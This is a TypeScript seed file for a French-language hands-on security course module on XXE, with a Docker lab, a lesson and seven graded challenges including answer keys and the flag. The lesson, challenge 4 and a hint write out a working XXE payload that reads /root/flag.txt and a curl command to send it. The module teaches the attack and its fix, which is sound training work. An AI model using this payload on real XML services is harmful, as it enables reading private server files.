import type { CourseSeed } from "../../../types";

/** Cyber · Pratique — Module 37 : XXE (XML External Entity). Lab Docker réel. */
export const module37XxeInjection: CourseSeed[] = [
  {
    slug: "prat-xxe-injection",
    title: "XXE — entité externe XML",
    checkpoint: "prat-securite-app",
    codename: "Silent Entity",
    domain: "Sécurité applicative",
    theme: "grid",
    icon: "Binary",
    accent: "#4FC4C4",
    order: 37,
    difficulty: "hard",
    summary:
      "Ce service analyse du XML envoyé en POST. Un document XML peut déclarer ses propres entités — y compris une entité SYSTEM pointant vers un fichier local. Un parseur qui résout ces entités lit alors ce fichier pour toi.",
    objectives: [
      "Envoyer du XML en POST à un service d'analyse",
      "Déclarer une entité externe via une DTD",
      "Faire lire un fichier local par le parseur",
      "Nommer la faille (XXE)",
      "Corriger en désactivant la résolution d'entités",
    ],
    sandbox: {
      attackerImage: "cyberace/attacker-base:latest",
      targetImage: "cyberace/module37-xxe-injection:latest",
      ttlSec: 900,
      attackerCapAdd: [],
      ports: [{ containerPort: 7681, label: "Terminal web (ttyd)" }],
    },
    lesson: `# 🧬 XXE — Silent Entity

Ce service **analyse du XML** envoyé en POST. Or un document XML peut **déclarer ses propres entités** — y compris une entité pointant vers un **fichier local**. 🏎️

---

## 🧭 Le briefing

> Ce service analyse du XML envoyé en POST. Un document XML peut déclarer ses propres entités — y compris des entités pointant vers un fichier local.

Tu es l'attaquant, avec \`curl\`. La cible parse le XML avec résolution d'entités **activée**.

---

## 1. Les entités XML 🧩

Une **DTD** (en tête du document) peut définir des **entités**. Une entité **externe** utilise le mot-clé **\`SYSTEM\`** et une URI — par exemple un fichier local via \`file://\` :

\`\`\`xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///chemin/fichier">]>
\`\`\`

Quand le parseur **résout** l'entité \`&xxe;\`, il **lit** le fichier et **insère son contenu** dans le document.

---

## 2. Construire le payload 🎯

\`\`\`xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///root/flag.txt">]>
<root>&xxe;</root>
\`\`\`

L'élément \`<root>\` contient \`&xxe;\` → à l'analyse, il **devient** le contenu de \`/root/flag.txt\`.

---

## 3. Envoyer 📤

Écris le payload dans un fichier, puis&nbsp;:

\`\`\`bash
curl -X POST --data-binary @payload.xml http://target:8080/
\`\`\`

Le service renvoie le texte de \`<root>\` — c'est-à-dire le contenu du fichier.

---

## 4. Nommer & corriger 🛡️

- **Faille** : **XXE** (*XML External Entity*) — résolution d'entités externes par le parseur XML.
- **Correction** : **désactiver** la résolution des entités externes (\`resolve_entities=False\`, désactiver le chargement de DTD/entités). Presque aucune application n'a besoin d'entités externes.

---

## 🧠 À retenir

- Une **entité externe** \`<!ENTITY x SYSTEM "file://...">\` fait lire un fichier au parseur.
- Le mot-clé **\`SYSTEM\`** désigne une ressource externe.
- **\`curl -X POST --data-binary @fichier\`** envoie le XML brut.
- Parade : **désactiver** la résolution d'entités externes dans le parseur.
- Comme la LFI (Module 32), c'est une **lecture de fichier arbitraire**, par un autre chemin.`,
    badge: {
      id: "badge-prat-xxe",
      name: "Invocateur d'Entités",
      icon: "Binary",
      description: "A fait lire un fichier local à un simple analyseur XML.",
    },
    challenges: [
      {
        id: "prat-xxe-t1",
        title: "Premier contact",
        order: 1,
        difficulty: "easy",
        type: "text",
        prompt: `## 👋 Premier contact

Démarre le lab. Interroge le service :

\`\`\`bash
curl http://target:8080/
\`\`\`

**Question :** quel **outil en ligne de commande** enverra le payload ?`,
        points: 50,
        timeLimitSec: 200,
        hints: [],
        answer: "curl",
        caseSensitive: false,
        explanation: `**\`curl\`** enverra le XML en POST. Le service attend du XML à analyser.`,
        tags: ["xxe", "curl", "recon"],
      },
      {
        id: "prat-xxe-t2",
        title: "Le format attendu",
        order: 2,
        difficulty: "easy",
        type: "mcq",
        prompt: `## 📄 Le format

**Question :** quel **format de données** ce service attend-il en POST ?`,
        points: 100,
        timeLimitSec: 250,
        hints: [],
        options: ["XML", "JSON", "CSV", "YAML"],
        answer: 0,
        explanation: `Le service analyse du **XML** — le format qui autorise la déclaration d'entités.`,
        tags: ["xxe", "xml"],
      },
      {
        id: "prat-xxe-t3",
        title: "Déclarer une entité externe",
        order: 3,
        difficulty: "medium",
        type: "text",
        prompt: `## 🧩 L'entité externe

Une entité externe se déclare dans une DTD :

\`\`\`xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///chemin">]>
\`\`\`

**Question :** quel **mot-clé DTD** déclare une entité pointant vers une ressource externe (ici un fichier local) ?`,
        points: 200,
        timeLimitSec: 400,
        hints: [],
        answer: "SYSTEM",
        accept: ["ENTITY SYSTEM"],
        caseSensitive: false,
        explanation: `Le mot-clé **\`SYSTEM\`** indique une entité **externe** (fichier, URL). C'est lui qui déclenche la lecture du fichier à la résolution.`,
        tags: ["xxe", "dtd", "system"],
      },
      {
        id: "prat-xxe-t4",
        title: "Exploiter",
        order: 4,
        difficulty: "hard",
        type: "text",
        prompt: `## 🎯 Lire le flag

Écris ce payload dans \`payload.xml\` :

\`\`\`xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///root/flag.txt">]>
<root>&xxe;</root>
\`\`\`

puis envoie-le :

\`\`\`bash
curl -X POST --data-binary @payload.xml http://target:8080/
\`\`\`

**Question :** colle le **flag** renvoyé.`,
        points: 350,
        timeLimitSec: 700,
        hints: [
          { text: "Écris d'abord le payload XML dans un fichier local, puis envoie-le avec --data-binary @fichier (pas -d, qui altère les retours à la ligne).", cost: 25 },
          { text: "Payload complet : <!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///root/flag.txt\">]> puis <root>&xxe;</root>", cost: 40 },
        ],
        answer: "CYBERACE{xxe_entite_externe_lecture_fichier}",
        caseSensitive: true,
        explanation: `Le parseur résout \`&xxe;\` en lisant \`/root/flag.txt\` → le contenu de \`<root>\` devient \`CYBERACE{xxe_entite_externe_lecture_fichier}\`.`,
        tags: ["xxe", "flag"],
      },
      {
        id: "prat-xxe-t5",
        title: "Nommer la faille",
        order: 5,
        difficulty: "medium",
        type: "text",
        prompt: `## 🏷️ Nommer la faille

**Question :** comment appelle-t-on cette vulnérabilité ?`,
        points: 150,
        timeLimitSec: 300,
        hints: [],
        answer: "XXE",
        accept: ["xml external entity", "entite externe xml"],
        caseSensitive: false,
        explanation: `C'est une **XXE** (*XML External Entity*) : l'abus des entités externes d'un parseur XML pour lire des fichiers (ou plus).`,
        tags: ["xxe", "vocabulaire"],
      },
      {
        id: "prat-xxe-t6",
        title: "Contre-mesure",
        order: 6,
        difficulty: "medium",
        type: "mcq",
        prompt: `## 🛡️ Corriger

**Question :** quelle correction règle cette vulnérabilité ?`,
        points: 150,
        timeLimitSec: 300,
        hints: [],
        options: [
          "Désactiver la résolution des entités externes dans le parseur XML (ex: resolve_entities=False)",
          "Interdire uniquement le mot DOCTYPE dans le contenu",
          "Utiliser HTTPS au lieu de HTTP",
          "Limiter la taille maximale du document XML",
        ],
        answer: 0,
        explanation: `On **désactive** la résolution d'entités externes (\`resolve_entities=False\`, pas de chargement de DTD). Quasi aucune app n'en a besoin — c'est la parade racine.`,
        tags: ["xxe", "contre-mesure"],
      },
      {
        id: "prat-xxe-t7",
        title: "Synthèse",
        order: 7,
        difficulty: "easy",
        type: "mcq",
        prompt: `## 🎓 Synthèse

**Question :** quel est le point commun entre XXE et le Module 32 (LFI) ?`,
        points: 50,
        timeLimitSec: 200,
        hints: [],
        options: [
          "Les deux permettent, par des chemins différents, de lire un fichier du serveur qui ne devrait pas être accessible",
          "Les deux nécessitent obligatoirement Python",
          "Les deux exploitent une faille réseau, pas applicative",
          "Il n'y a aucun point commun",
        ],
        answer: 0,
        explanation: `LFI et XXE mènent toutes deux à une **lecture de fichier arbitraire** — l'une par un chemin, l'autre par une entité XML.`,
        tags: ["xxe", "synthese"],
      },
    ],
  },
];
